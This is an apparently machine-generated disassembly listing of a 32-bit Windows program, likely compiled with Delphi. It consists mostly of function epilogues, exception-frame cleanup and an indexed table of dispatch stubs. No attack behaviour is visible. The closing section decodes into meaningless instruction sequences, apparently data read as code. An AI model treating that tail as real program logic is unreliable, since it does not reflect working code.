jmp sub_403834
sub_45684b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4568c4
jmp sub_403834
sub_4568cb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_456948
jmp sub_403834
sub_45694f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4569a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4229bc
pop esi
pop ebx
retn
sub_4569bc
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_456a2b
jmp sub_403834
sub_456a32
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456a9f
jmp sub_403834
sub_456aa6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456ad1
jmp sub_403834
sub_456ad8
pop ebp
retn
sub_456adc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41327c
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_455f98
mov [ rw-data ] eax
sub_457561
jmp sub_403834
sub_457568
pop ebp
retn
sub_45756c
sub [ rw-data ] 0x1
retn
sub_457841
jmp sub_403834
sub_457848
pop ebp
retn
sub_45784c
sub [ rw-data ] 0x1
retn
sub_45796c
jmp sub_403834
sub_4579a4
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_458804
sub_4579c0
mov eax 0x0
call sub_458750
jmp eax
sub_4579cc
retn
sub_4579d0
mov eax 0x1
call sub_458750
jmp eax
sub_4579dc
retn
sub_4579e0
mov eax 0x2
call sub_458750
jmp eax
sub_4579ec
retn
sub_4579f0
mov eax 0x3
call sub_458750
jmp eax
sub_4579fc
retn
sub_457a00
mov eax 0x4
call sub_458750
jmp eax
sub_457a0c
retn
sub_457a10
mov eax 0x5
call sub_458750
jmp eax
sub_457a1c
retn
sub_457a20
mov eax 0x6
call sub_458750
jmp eax
sub_457a2c
retn
sub_457a30
mov eax 0x7
call sub_458750
jmp eax
sub_457a3c
retn
sub_457a40
mov eax 0x8
call sub_458750
jmp eax
sub_457a4c
retn
sub_457a50
mov eax 0x9
call sub_458750
jmp eax
sub_457a5c
retn
sub_457a60
mov eax 0xa
call sub_458750
jmp eax
sub_457a6c
retn
sub_457a70
mov eax 0xb
call sub_458750
jmp eax
sub_457a7c
retn
sub_457a80
mov eax 0xc
call sub_458750
jmp eax
sub_457a8c
retn
sub_457a90
mov eax 0xd
call sub_458750
jmp eax
sub_457a9c
retn
sub_457aa0
mov eax 0xe
call sub_458750
jmp eax
sub_457aac
retn
sub_457ab0
mov eax 0xf
call sub_458750
jmp eax
sub_457abc
retn
sub_457ac0
mov eax 0x10
call sub_458750
jmp eax
sub_457acc
retn
sub_457ad0
mov eax 0x11
call sub_458750
jmp eax
sub_457adc
retn
sub_457ae0
mov eax 0x12
call sub_458750
jmp eax
sub_457aec
retn
sub_457af0
mov eax 0x13
call sub_458750
jmp eax
sub_457afc
retn
sub_457b00
mov eax 0x14
call sub_458750
jmp eax
sub_457b0c
retn
sub_457b10
mov eax 0x15
call sub_458750
jmp eax
sub_457b1c
retn
sub_457b20
mov eax 0x16
call sub_458750
jmp eax
sub_457b2c
retn
sub_457b30
mov eax 0x17
call sub_458750
jmp eax
sub_457b3c
retn
sub_457b40
mov eax 0x18
call sub_458750
jmp eax
sub_457b4c
retn
sub_457b50
mov eax 0x19
call sub_458750
jmp eax
sub_457b5c
retn
sub_457b60
mov eax 0x1a
call sub_458750
jmp eax
sub_457b6c
retn
sub_457b70
mov eax 0x1b
call sub_458750
jmp eax
sub_457b7c
retn
sub_457b80
mov eax 0x1c
call sub_458750
jmp eax
sub_457b8c
retn
sub_457b90
mov eax 0x1d
call sub_458750
jmp eax
sub_457b9c
retn
sub_457ba0
mov eax 0x1e
call sub_458750
jmp eax
sub_457bac
retn
sub_457bb0
mov eax 0x1f
call sub_458750
jmp eax
sub_457bbc
retn
sub_457bc0
mov eax 0x20
call sub_458750
jmp eax
sub_457bcc
retn
sub_457bd0
mov eax 0x21
call sub_458750
jmp eax
sub_457bdc
retn
sub_457be0
mov eax 0x22
call sub_458750
jmp eax
sub_457bec
retn
sub_457bf0
mov eax 0x23
call sub_458750
jmp eax
sub_457bfc
retn
sub_457c00
mov eax 0x24
call sub_458750
jmp eax
sub_457c0c
retn
sub_457c10
mov eax 0x25
call sub_458750
jmp eax
sub_457c1c
retn
sub_457c20
mov eax 0x26
call sub_458750
jmp eax
sub_457c2c
retn
sub_457c30
mov eax 0x27
call sub_458750
jmp eax
sub_457c3c
retn
sub_457c40
mov eax 0x28
call sub_458750
jmp eax
sub_457c4c
retn
sub_457c50
mov eax 0x29
call sub_458750
jmp eax
sub_457c5c
retn
sub_457c60
mov eax 0x2a
call sub_458750
jmp eax
sub_457c6c
retn
sub_457c70
mov eax 0x2b
call sub_458750
jmp eax
sub_457c7c
retn
sub_457c80
mov eax 0x2c
call sub_458750
jmp eax
sub_457c8c
retn
sub_457c90
mov eax 0x2d
call sub_458750
jmp eax
sub_457c9c
retn
sub_457ca0
mov eax 0x2e
call sub_458750
jmp eax
sub_457cac
retn
sub_457cb0
mov eax 0x2f
call sub_458750
jmp eax
sub_457cbc
retn
sub_457cc0
mov eax 0x30
call sub_458750
jmp eax
sub_457ccc
retn
sub_457cd0
mov eax 0x31
call sub_458750
jmp eax
sub_457cdc
retn
sub_457ce0
mov eax 0x32
call sub_458750
jmp eax
sub_457cec
retn
sub_457cf0
mov eax 0x33
call sub_458750
jmp eax
sub_457cfc
retn
sub_457d00
mov eax 0x34
call sub_458750
jmp eax
sub_457d0c
retn
sub_457d10
mov eax 0x35
call sub_458750
jmp eax
sub_457d1c
retn
sub_457d20
mov eax 0x36
call sub_458750
jmp eax
sub_457d2c
retn
sub_457d30
mov eax 0x37
call sub_458750
jmp eax
sub_457d3c
retn
sub_457d40
mov eax 0x38
call sub_458750
jmp eax
sub_457d4c
retn
sub_457d50
mov eax 0x39
call sub_458750
jmp eax
sub_457d5c
retn
sub_457d60
mov eax 0x3a
call sub_458750
jmp eax
sub_457d6c
retn
sub_457d70
mov eax 0x3b
call sub_458750
jmp eax
sub_457d7c
retn
sub_457d80
mov eax 0x3c
call sub_458750
jmp eax
sub_457d8c
retn
sub_457d90
mov eax 0x3d
call sub_458750
jmp eax
sub_457d9c
retn
sub_457da0
mov eax 0x3e
call sub_458750
jmp eax
sub_457dac
retn
sub_457db0
mov eax 0x3f
call sub_458750
jmp eax
sub_457dbc
retn
sub_457dc0
mov eax 0x40
call sub_458750
jmp eax
sub_457dcc
retn
sub_457dd0
mov eax 0x41
call sub_458750
jmp eax
sub_457ddc
retn
sub_457de0
mov eax 0x42
call sub_458750
jmp eax
sub_457dec
retn
sub_457df0
mov eax 0x43
call sub_458750
jmp eax
sub_457dfc
retn
sub_457e00
mov eax 0x44
call sub_458750
jmp eax
sub_457e0c
retn
sub_457e10
mov eax 0x45
call sub_458750
jmp eax
sub_457e1c
retn
sub_457e20
mov eax 0x46
call sub_458750
jmp eax
sub_457e2c
retn
sub_457e30
mov eax 0x47
call sub_458750
jmp eax
sub_457e3c
retn
sub_457e40
mov eax 0x48
call sub_458750
jmp eax
sub_457e4c
retn
sub_457e50
mov eax 0x49
call sub_458750
jmp eax
sub_457e5c
retn
sub_457e60
mov eax 0x4a
call sub_458750
jmp eax
sub_457e6c
retn
sub_457e70
mov eax 0x4b
call sub_458750
jmp eax
sub_457e7c
retn
sub_457e80
mov eax 0x4c
call sub_458750
jmp eax
sub_457e8c
retn
sub_457e90
mov eax 0x4d
call sub_458750
jmp eax
sub_457e9c
retn
sub_457ea0
mov eax 0x4e
call sub_458750
jmp eax
sub_457eac
retn
sub_457eb0
mov eax 0x4f
call sub_458750
jmp eax
sub_457ebc
retn
sub_457ec0
mov eax 0x50
call sub_458750
jmp eax
sub_457ecc
retn
sub_457ed0
mov eax 0x51
call sub_458750
jmp eax
sub_457edc
retn
sub_457ee0
mov eax 0x52
call sub_458750
jmp eax
sub_457eec
retn
sub_457ef0
mov eax 0x53
call sub_458750
jmp eax
sub_457efc
retn
sub_457f00
mov eax 0x54
call sub_458750
jmp eax
sub_457f0c
retn
sub_457f10
mov eax 0x55
call sub_458750
jmp eax
sub_457f1c
retn
sub_457f20
mov eax 0x56
call sub_458750
jmp eax
sub_457f2c
retn
sub_457f30
mov eax 0x57
call sub_458750
jmp eax
sub_457f3c
retn
sub_457f40
mov eax 0x58
call sub_458750
jmp eax
sub_457f4c
retn
sub_457f50
mov eax 0x59
call sub_458750
jmp eax
sub_457f5c
retn
sub_457f60
mov eax 0x5a
call sub_458750
jmp eax
sub_457f6c
retn
sub_457f70
mov eax 0x5b
call sub_458750
jmp eax
sub_457f7c
retn
sub_457f80
mov eax 0x5c
call sub_458750
jmp eax
sub_457f8c
retn
sub_457f90
mov eax 0x5d
call sub_458750
jmp eax
sub_457f9c
retn
sub_457fa0
mov eax 0x5e
call sub_458750
jmp eax
sub_457fac
retn
sub_457fb0
mov eax 0x5f
call sub_458750
jmp eax
sub_457fbc
retn
sub_457fc0
mov eax 0x60
call sub_458750
jmp eax
sub_457fcc
retn
sub_457fd0
mov eax 0x61
call sub_458750
jmp eax
sub_457fdc
retn
sub_457fe0
mov eax 0x62
call sub_458750
jmp eax
sub_457fec
retn
sub_457ff0
mov eax 0x63
call sub_458750
jmp eax
sub_457ffc
retn
sub_458000
mov eax 0x64
call sub_458750
jmp eax
sub_45800c
retn
sub_458010
mov eax 0x65
call sub_458750
jmp eax
sub_45801c
retn
sub_458020
mov eax 0x66
call sub_458750
jmp eax
sub_45802c
retn
sub_458030
mov eax 0x67
call sub_458750
jmp eax
sub_45803c
retn
sub_458040
mov eax 0x68
call sub_458750
jmp eax
sub_45804c
retn
sub_458050
mov eax 0x69
call sub_458750
jmp eax
sub_45805c
retn
sub_458060
mov eax 0x6a
call sub_458750
jmp eax
sub_45806c
retn
sub_458070
mov eax 0x6b
call sub_458750
jmp eax
sub_45807c
retn
sub_458080
mov eax 0x6c
call sub_458750
jmp eax
sub_45808c
retn
sub_458090
mov eax 0x6d
call sub_458750
jmp eax
sub_45809c
retn
sub_4580a0
mov eax 0x6e
call sub_458750
jmp eax
sub_4580ac
retn
sub_4580b0
mov eax 0x6f
call sub_458750
jmp eax
sub_4580bc
retn
sub_4587f3
jmp sub_403834
sub_4587fa
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4588f5
jmp sub_403834
sub_4588fc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_458960
jmp sub_403834
sub_458967
pop ebp
retn
sub_45896c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_458804
sub_4589a1
jmp sub_403834
sub_4589a8
pop ebp
retn
sub_4589ac
sub [ rw-data ] 0x1
retn
sub_458c38
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_458c44
retn
sub_458ceb
jmp sub_403834
sub_458cf2
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_458d4a
jmp sub_403834
sub_458d51
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458d58
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403404
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_458d78
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_4591f6
jmp sub_403834
sub_4591fd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4592ef
jmp sub_403834
sub_4592f6
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_459384
jmp sub_403834
sub_45938b
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4593b9
jmp sub_403834
sub_4593c0
pop ebp
retn
sub_4593c4
sub [ rw-data ] 0x1
retn
sub_4595b2
lea eax [ ebp - 0x194 ]
call sub_403eb4
retn
sub_4595be
jmp sub_403834
j_sub_4595b2
jmp sub_4595b2
sub_4595c5
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4596a0
jmp sub_403834
sub_4596a7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45973b
jmp sub_403834
sub_459742
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4597b8
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4598fc
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4599af
jmp sub_403834
sub_4599b6
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_459a91
jmp sub_403834
sub_459a98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459c84
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_459c90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_459ca8
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_459cb4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_4036ac#4
jmp sub_4036ac
sub_459d35
add [ eax ] eax
add [ eax ] al
cmp al 0x73
inc eax
add [ ecx - 0x63 ] al
inc ebp
add [ ebx + 0x4589fc45 ] cl
hlt
sub_459d8d
jmp sub_403834
sub_459d94
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403580#3
jmp sub_403580
sub_459ebd
jmp sub_403834
sub_459ec4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459ed0
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_459edc
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_459f82
jmp sub_403834
sub_459f89
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a045
jmp sub_403834
sub_45a04c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a069
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_45a062
jmp sub_403834
sub_45a069
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_45a137
jmp sub_403834
sub_45a13e
pop ebx
mov esp ebp
pop ebp
retn
sub_45a147
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45a1ea
jmp sub_403834
sub_45a1f1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45a28a
jmp sub_403834
sub_45a291
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45a316
jmp sub_403834
sub_45a31d
pop ecx
pop ebp
retn
sub_45a320
mov eax [ eax + 0x4 ]
retn
sub_45a37e
jmp sub_403834
sub_45a385
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_45a461
jmp sub_403834
sub_45a468
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a4a9
jmp sub_403834
sub_45a4b0
pop ebp
retn
sub_45a4b4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_459fac
sub_45a505
jmp sub_403834
sub_45a50c
pop ebp
retn
sub_45a510
sub [ rw-data ] 0x1
retn
sub_45a644
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40bfc4
pop esi
pop ebx
retn
sub_45a658
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_45a7a3
jmp sub_403834
sub_45a7aa
pop ebx
pop ecx
pop ebp
retn
sub_45a879
jmp sub_403834
sub_45a880
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45a950
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_45a964
call sub_4044b8
retn
sub_45aa1f
jmp sub_403834
sub_45aa26
pop ebp
retn
sub_45aafb
jmp sub_403834
sub_45ab02
pop ecx
pop ebp
retn
sub_45ac30
retn
j_sub_45ac30
jmp sub_45ac30
sub_45ac38
pop ebp
retn
sub_45ac3c
sub [ rw-data ] 0x1
retn
sub_45ae3b
jmp sub_403834
sub_45ae42
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_45af1d
jmp sub_403834
sub_45af24
pop ebp
retn
sub_45af28
sub [ rw-data ] 0x1
retn
sub_45b182
jmp sub_403834
sub_45b189
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_45b20f
jmp sub_403834
sub_45b216
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403454
sub_45b2d3
jmp sub_403834
sub_45b2da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45b404
jmp sub_403834
sub_45b40b
pop ebp
retn
sub_45b410
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45b37c
call sub_403bdc
mov dl 0x1
mov eax [ r-xdata ]
call sub_424870
mov [ rw-data ] eax
sub_45b51c
retn
sub_45b520
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_45b554
retn
sub_45b558
retn
sub_45b581
jmp sub_403834
sub_45b588
pop ebp
retn
sub_45b58c
sub [ rw-data ] 0x1
retn
sub_45b5b9
jmp sub_403834
sub_45b5c0
pop ebp
retn
sub_45b5c4
sub [ rw-data ] 0x1
retn
sub_45bacd
jmp sub_403834
sub_45bad4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036ac#3
jmp sub_4036ac
sub_45bba9
jmp [ ecx + rw-data ]
j_sub_4036ac#2
jmp sub_4036ac
sub_45bcf9
jmp [ ecx + rw-data ]
sub_45be1f
jmp sub_403580
j_sub_403580#2
jmp sub_403580
sub_45c0bf
jmp sub_403834
sub_45c0c6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c111
jmp sub_403834
sub_45c118
pop ebp
retn
sub_45c11c
sub [ rw-data ] 0x1
retn
sub_45c6b4
jmp sub_403834
sub_45c6bb
pop ebx
mov esp ebp
pop ebp
retn
sub_45c8bc
jmp sub_403834
sub_45c8d9
jmp sub_403834
sub_45c8e0
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ca59
jmp sub_403834
sub_45ca60
pop ebp
retn
sub_45ca64
sub [ rw-data ] 0x1
retn
sub_45ca91
jmp sub_403834
sub_45ca98
pop ebp
retn
sub_45ca9c
sub [ rw-data ] 0x1
retn
sub_45cac9
jmp sub_403834
sub_45cad0
pop ebp
retn
sub_45cad4
sub [ rw-data ] 0x1
retn
sub_45cb01
jmp sub_403834
sub_45cb08
pop ebp
retn
sub_45cb0c
sub [ rw-data ] 0x1
retn
sub_45cb39
jmp sub_403834
sub_45cb40
pop ebp
retn
sub_45cb44
sub [ rw-data ] 0x1
retn
sub_45cb71
jmp sub_403834
sub_45cb78
pop ebp
retn
sub_45cb7c
sub [ rw-data ] 0x1
retn
sub_45cd38
push ebx
mov ebx eax
mov eax ebx
call sub_45b51c
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
pop ebx
retn
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
sub_45ce9d
jmp sub_403834
sub_45cea4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cec1
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
sub_45ceba
jmp sub_403834
sub_45cec1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45d099
jmp sub_403834
sub_45d0a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_45d0ac
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_45d12c
mov eax [ eax + 0x68 ]
call sub_45c7a8
retn
sub_45d1a8
jmp sub_403834
sub_45d1af
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d228
jmp sub_403834
sub_45d22f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036ac#5
jmp sub_4036ac
sub_45d38e
add [ eax ] eax
add [ eax ] al
adc al 0x6d
inc eax
add [ edx - 0x76ffba2d ] bl
retn
sub_45d3e5
jmp sub_403834
sub_45d3ec
pop ebp
retn
sub_45d3f0
sub [ rw-data ] 0x1
retn
sub_45d44f
jmp sub_403834
sub_45d456
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_45d4a6
jmp sub_403834
sub_45d4ad
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_45d50b
jmp sub_403834
sub_45d512
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_45df23
jmp [ esi ]
sub_45e257
jmp [ eax ]
sub_45e58f
jmp [ eax ]
sub_45e6cc
push edx
push 0x0
push eax
call [ rw-data ]
add esp 0xc
retn
sub_45e6dc
push 0x0
push eax
call [ rw-data ]
add esp 0x8
retn
sub_45e6ec
cmp [ rw-data ] 0x0
je r-xdata
retn
call [ rw-data ]
sub_45e728
jmp sub_403834
sub_45e72f
pop ebp
retn
sub_45e734
sub [ rw-data ] 0x1
retn
sub_45e761
jmp sub_403834
sub_45e768
pop ebp
retn
sub_45e76c
sub [ rw-data ] 0x1
retn
sub_45e799
jmp sub_403834
sub_45e7a0
pop ebp
retn
sub_45e7a4
sub [ rw-data ] 0x1
retn
sub_45e8b5
jmp sub_403834
sub_45e8bc
pop ebp
retn
sub_45e8c0
sub [ rw-data ] 0x1
retn
sub_45e8ed
jmp sub_403834
sub_45e8f4
pop ebp
retn
sub_45e8f8
sub [ rw-data ] 0x1
retn
sub_45e925
jmp sub_403834
sub_45e92c
pop ebp
retn
sub_45e930
sub [ rw-data ] 0x1
retn
sub_45e95d
jmp sub_403834
sub_45e964
pop ebp
retn
sub_45e968
sub [ rw-data ] 0x1
retn
sub_45e995
jmp sub_403834
sub_45e99c
pop ebp
retn
sub_45e9a0
sub [ rw-data ] 0x1
retn
sub_45e9cd
jmp sub_403834
sub_45e9d4
pop ebp
retn
sub_45e9d8
sub [ rw-data ] 0x1
retn
sub_45f876
jmp sub_403834
sub_45f87d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f89f
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ed8
retn
j_sub_403834#9
jmp sub_403834
sub_45f89f
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f983
jmp sub_403834
sub_45f98a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f9b4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403ed8
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
j_sub_403834#8
jmp sub_403834
sub_45f9b4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fa20
mov eax rw-data
call sub_40cc80
mov eax rw-data
call sub_40cc80
mov eax rw-data
call sub_40cc80
call sub_45e678
retn
j_sub_403580
jmp sub_403580
j_sub_403834#7
jmp sub_403834
sub_45fe3e
jmp sub_403834
sub_45fe45
pop ebx
pop ecx
pop ebp
retn
sub_45fe4c
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_45fe68
push ebx
mov cl 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov eax ecx
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov ecx eax
j_sub_4036ac
jmp sub_4036ac
sub_45ffc0
push ebx
mov ebx eax
lea eax [ ebx + 0x80 ]
call sub_40cc80
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov eax ebx
call sub_45cd38
pop ebx
retn
lea eax [ ebx + 0x78 ]
call sub_40cc80
sub_45ffe8
call sub_45d0fc
retn
sub_45fff0
push ebx
cmp [ eax + 0xb0 ] 0x0
je r-xdata
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
call sub_45d138
pop ebx
retn
sub_460008
push ebx
cmp [ eax + 0xb0 ] 0x0
je r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop ebx
retn
call sub_45d1b8
pop ebx
retn
sub_460020
mov eax [ eax + 0x80 ]
call sub_460dc4
retn
sub_46002c
mov eax [ eax + 0x80 ]
call sub_460e10
retn
j_sub_403580#4
jmp sub_403580
sub_460084
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
call sub_403894
call sub_4038e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4601a3
jmp sub_403834
sub_4601aa
pop ebx
pop ecx
pop ebp
retn
sub_4601b0
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4601cc
push ebx
mov cl 0x1
cmp [ eax + 0x9a ] 0x0
je r-xdata
mov eax ecx
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov ecx eax
sub_46022c
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_4602dc
jmp sub_403834
sub_4602e3
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
j_sub_403834#6
jmp sub_403834
sub_4605a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460812
jmp sub_403834
sub_460819
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403834#5
jmp sub_403834
sub_460b68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403834#4
jmp sub_403834
sub_460d5d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403834#3
jmp sub_403834
sub_461073
pop ebp
retn
sub_461078
sub [ rw-data ] 0x1
retn
sub_46116e
inc esp
add al cl
xchg [ ebx ] eax
int3
sub_4614dd
mov ebp 0x5fd41b5e
retn
sub_46160a
mov bl 0x25
mov ebx 0x528c36b8
popfd
iretd
sub_461613
xor edi [ ecx - 0x23 ]
fcmovnu st3
mov bl 0x5f
mov al [ 0x528c0ec5 ]
popfd
retn
sub_46162f
xor ebx [ ebp - 0x23 ]
fcmovnu st3
mov bl 0x16
0xbed9
sub_46170f
xor dl [ edi - 0x34 ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
fcmovnbe st4
insb
popfd
iretd
sub_461724
xor bl [ edi - 0x31 ]
fcmovnu st3
fcmovnu st3
pop ebx
cmpsb [ esi ] [ edi ]

sub_4617bf
retn 0xdbdb
sub_461870
and al 0x24
and al 0x8d

sub_4618c5
fisttp [ eax + 0x4d24dbb1 ]
pop ebx
fcmovnu st3
fist [ eax + 0x2b ]
pop esi
sub eax 0xd6025fd4
fcmovnu st3
push eax
sahf

sub_4618dc
push edx
retn
sub_461af4
rcr bl cl
fisttp [ eax - 0x241c0bce ]
fcmovnu st3
fcmovnu st3
fcmovnu st3
mov ebp 0x83399e52
mov cl 0xba
mov ebp 0x833f9e52
mov cl 0xaf
mov ebp 0x323d9e52
pop edi
0xdbdb
sub_461b97
xor al dh
int3
sub_4629f6
mov ecx [ eax - 0x253acd78 ]
fcmovnu st3
push esi
pop esi
pop ebx
and al 0x24
mov ecx [ eax + 0x328b8c24 ]

sub_462a64
xor ch [ ebp - 0x2d ]
fcmovnu st3
fcmovnu st3
fcmovnbe st4
insb
popfd
iretd
sub_462f6f
test [ eax ] ebx
fcmovnu st3
fcmovnu st3
pop edx
aaa
retn
sub_462f87
and al 0x96
xlat
push ebx
iretd
sub_4630d8
mov cl 0xdf
mov bl 0xdb
jmp sub_4630b9
sub_463188
pop ebp
and ebx ebx
fcmovnu st3
xor esi ebx
xor [ esp ] ah
pop eax
pop ds
retn
sub_4631f1
xor al [ 0xffffffffdb24243f ]
fist [ eax - 0x6a ]
rcl [ esi - 0x52 ] cl

sub_4633d9
xchg esi eax
shl [ edx ] cl
dec ecx
0xdbdbdbdb 0x350
sub_4633e4
mov ebp 0x50238652
add eax 0x218652bd
push eax
add edi [ ebp - 0x17d879ae ]
add [ ebp + 0x50258652 ] bh
add [ ebp - 0x4e8479ae ] edi
test al 0x50
add dh [ edx ]
cmc
retn
sub_463439
rcr bl 0x1
fnclex
xchg bl dl
aam 0x5f
stc
rcr bl 0x1
fnclex
xchg bh dl
aam 0x5f
retn 0xdbd0
sub_463606
fistp [ eax + 0x1f ]

sub_46360a
push eax
